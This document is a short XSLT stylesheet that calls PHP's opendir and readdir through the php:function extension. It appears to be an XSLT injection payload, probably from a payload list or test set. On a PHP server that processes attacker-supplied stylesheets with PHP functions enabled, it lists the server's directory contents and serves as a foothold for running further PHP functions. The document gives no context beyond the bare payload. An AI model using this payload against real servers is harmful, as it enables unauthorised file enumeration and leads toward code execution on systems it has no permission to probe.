<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:param name="array"
    select="php:function('opendir', '.')"/>
<xsl:value-of select="php:function('readdir', $array)" />
</xsl:template>
</xsl:stylesheet>
